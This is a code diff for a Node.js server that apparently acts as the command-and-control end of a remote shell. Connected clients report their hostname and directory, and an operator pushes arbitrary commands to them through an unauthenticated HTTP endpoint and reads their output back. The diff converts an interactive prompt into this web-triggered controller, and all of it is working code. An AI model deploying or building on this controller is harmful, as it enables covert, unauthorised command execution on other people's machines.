@@ -1,60 +1,70 @@
+const http = require("http");
 const WebSocket = require("ws");
-const readline = require("readline");
 
-const wss = new WebSocket.Server({ host: "0.0.0.0", port: 8765 });
+const PORT = process.env.PORT || 8765;
 
-console.log("Running on ws://localhost:8765");
+let client = null;
+let name = "client";
+let path = "~";
+let lastOutput = "no output";
 
-wss.on("connection", (ws) => {
-    console.log("client connected");
+const server = http.createServer((req,res)=>{
+    const url = new URL(req.url, `http://${req.headers.host}`);
 
-    let name = "client";
-    let path = "~";
-
-    ws.once("message", (data) => {
-        [path, name] = data.toString().split("|", 2);
-        promptLoop();
-    });
-
-    const rl = readline.createInterface({
-        input: process.stdin,
-        output: process.stdout
-    });
-
-    function ask(q) {
-        return new Promise(res => rl.question(q, res));
+    // health check
+    if (url.pathname === "/") {
+        res.end("alive");
+        return;
     }
 
-    async function promptLoop() {
-        try {
-            while (ws.readyState === WebSocket.OPEN) {
-
-                if (path.endsWith(":\\")) path = path.slice(0, -2);
-
-                let cmd = await ask(`${name}@${path}$ `);
-
-                if (cmd === "clear" || cmd === "cls") {
-                    console.clear();
-                    continue;
-                }
-
-                ws.send(cmd);
-
-                const reply = await new Promise(res => {
-                    ws.once("message", msg => res(msg.toString()));
-                });
-
-                if (reply.includes("|")) {
-                    [path, name] = reply.split("|", 2);
-                    continue;
-                }
-
-                console.log(reply.trim());
-            }
-        } catch {
-            console.log("\nconnection closed");
+    // send command
+    if (url.pathname === "/cmd") {
+        if (!client || client.readyState !== WebSocket.OPEN) {
+            res.end("no client");
+            return;
         }
+
+        const cmd = url.searchParams.get("c") || "";
+        client.send(cmd);
+        res.end("sent");
+        return;
     }
 
-    ws.on("close", () => console.log("\nclient left"));
+    // read last reply
+    if (url.pathname === "/out") {
+        res.end(lastOutput);
+        return;
+    }
+
+    res.end("unknown");
 });
+
+const wss = new WebSocket.Server({ server });
+
+wss.on("connection", ws => {
+    console.log("client connected");
+    client = ws;
+
+    ws.once("message", data => {
+        [path, name] = data.toString().split("|",2);
+    });
+
+    ws.on("message", msg => {
+        msg = msg.toString();
+
+        if (msg.includes("|")) {
+            [path,name] = msg.split("|",2);
+            return;
+        }
+
+        lastOutput = msg;
+        console.log(`[${name}] ${msg.slice(0,80)}`);
+    });
+
+    ws.on("close", ()=> {
+        console.log("client left");
+        client = null;
+    });
+});
+
+server.listen(PORT,"0.0.0.0",()=>console.log("running on",PORT));
